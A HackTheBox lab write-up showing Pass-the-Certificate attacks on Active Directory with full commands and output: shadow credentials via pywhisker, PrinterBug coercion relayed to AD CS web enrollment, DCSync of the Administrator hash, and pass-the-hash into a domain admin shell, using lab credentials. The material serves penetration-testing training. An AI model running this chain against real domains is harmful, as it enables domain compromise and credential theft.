### CPTS / HTB Penetration Tester Path <br>
### Password Attacks - Pass the Certificate <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Pass the Certificate



`PKINIT` (RFC 4556) — Kerberos extension that uses public-key crypto for AS-REQ. Smart cards rely on it. PtC = use an X.509 cert (+ key) to obtain a TGT for the user the cert is bound to.

Tools:

| Tool | Role |
|---|---|
| [pywhisker](https://github.com/ShutdownRepo/pywhisker) | Adds a key credential to a victim's `msDS-KeyCredentialLink` (cert mode) |
| [PKINITtools](https://github.com/dirkjanm/PKINITtools) | `gettgtpkinit.py` requests a TGT using the cert/key |
| [krbrelayx / printerbug.py](https://github.com/dirkjanm/krbrelayx) | Coerces machine auth → relay |
| [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket) | Relays sniffed/coerced auth to web enrollment endpoint |
| [certipy](https://github.com/ly4k/Certipy) | AD CS enumeration / abuse |

Bring `oscrypto` up to date (PKINITtools dep):

```diff
+ $ pip3 install -I git+https://github.com/wbond/oscrypto.git
```

<br>

Update `/etc/hosts` so DNS / Kerberos lookups resolve:

```diff
+ <DC-ip>   DC01.INLANEFREIGHT.LOCAL DC01
```

<br>

#### Common krb5.conf for evil-winrm w/ Kerberos

```diff
+ [libdefaults]
+ default_realm = INLANEFREIGHT.LOCAL
+ dns_lookup_realm = false
+ dns_lookup_kdc = false
+
+ [realms]
+ INLANEFREIGHT.LOCAL = { kdc = <DC-ip> }
+
+ [domain_realm]
+ .inlanefreight.local = INLANEFREIGHT.LOCAL
+ inlanefreight.local = INLANEFREIGHT.LOCAL
```

<br>

#### Workflow A — Shadow Credentials (pywhisker)

1. Add KeyCredential to victim with pywhisker.
2. Use the resulting `.pfx` against PKINITtools to get a TGT.
3. Set `KRB5CCNAME`, auth Kerberos.

#### Workflow B — Coerce + relay to AD CS web enrollment

1. Start ntlmrelayx targeting `http://CA/certsrv/certfnsh.asp` with `--adcs --template <template>`.
2. Trigger machine auth via printerbug.py.
3. Relay completes web enrollment → `.pfx` for the machine account.
4. PKINITtools → TGT → DCSync (since it's now `MACHINE$` w/ replication).

<br>

---

<br>

### Exercise

| Host | IP |
|---|---|
| DC | 10.129.234.174 (`ACADEMY-PWATTCK-PTCDC01`) |
| CA | 10.129.246.22 (`ACADEMY-PWATTCK-PTCCA01`) |

Creds: `wwhite` / `package5shores_topher1`

Add to `/etc/hosts`:

	10.129.234.174   DC01.INLANEFREIGHT.LOCAL DC01

Install `oscrypto` from source first:

```diff
+ $ pip3 install -I git+https://github.com/wbond/oscrypto.git
```

---

### Question 1:
What are the contents of flag.txt on jpinkman's desktop?

Clone pywhisker + install reqs:

```diff
+ $ git clone https://github.com/ShutdownRepo/pywhisker.git
+ $ cd pywhisker
+ $ pip install -r requirements.txt
```

<br>

Add a key credential targeting jpinkman:

```diff
+ $ python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
```

	[+] Updated the msDS-KeyCredentialLink attribute of the target object
	[+] Saved PFX (#PKCS12) certificate & key at path: H5Di7hY0.pfx
	[*] Must be used with password: q6bIXr6eYBroLwlCsQqK

<br>

Get jpinkman's TGT via PKINITtools:

```diff
+ $ git clone https://github.com/dirkjanm/PKINITtools.git
+ $ cd PKINITtools
+ $ python3 gettgtpkinit.py -cert-pfx /home/htb-ac-830862/pywhisker/pywhisker/H5Di7hY0.pfx -pfx-pass 'q6bIXr6eYBroLwlCsQqK' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
```

<br>

Export ccache + edit `/etc/krb5.conf` per notes, then auth via Kerberos:

```diff
+ $ export KRB5CCNAME=/tmp/jpinkman.ccache
+ $ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

<br>

In the resulting shell, browse to jpinkman's desktop and read flag.txt.

&#x1F6A9; found **3d7e3dfb56b200ef--edit--715cfc300f07f3f8**.

---

### Question 2:
What are the contents of flag.txt on Administrator's desktop?

CA web enrollment is at `http://10.129.246.22/certserv`.

Stand up ntlmrelayx targeting AD CS web enrollment with `KerberosAuthentication` template:

```diff
+ $ impacket-ntlmrelayx -t http://10.129.246.22/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

<br>

Coerce DC01 to authenticate via printerbug:

```diff
+ $ git clone https://github.com/dirkjanm/krbrelayx.git
+ $ cd krbrelayx
+ $ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.15.222
```

<br>

ntlmrelayx receives the coerced auth, completes web enrollment, writes `./DC01$.pfx`.

Use the cert to request a TGT for `dc01$`:

```diff
+ $ python3 -m venv .venv && source .venv/bin/activate
+ $ pip3 install -r requirements.txt
+ $ python3 gettgtpkinit.py -cert-pfx /home/htb-ac-830862/DC01$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
+ $ deactivate
+ $ export KRB5CCNAME=/tmp/dc.ccache
```

<br>

DC machine accounts can DCSync — pull Administrator's NTLM:

```diff
+ $ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

	Administrator:500:aad3b435...:fd02e525dd676fd8ca04e200d265f20c:::

<br>

PtH into a DA shell:

```diff
+ $ evil-winrm -i 10.129.234.174 -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
```

<br>

Cat the desktop flag.

&#x1F6A9; found **a1fc497a8433f5--edit--a1b4c18274019a2cdb**.
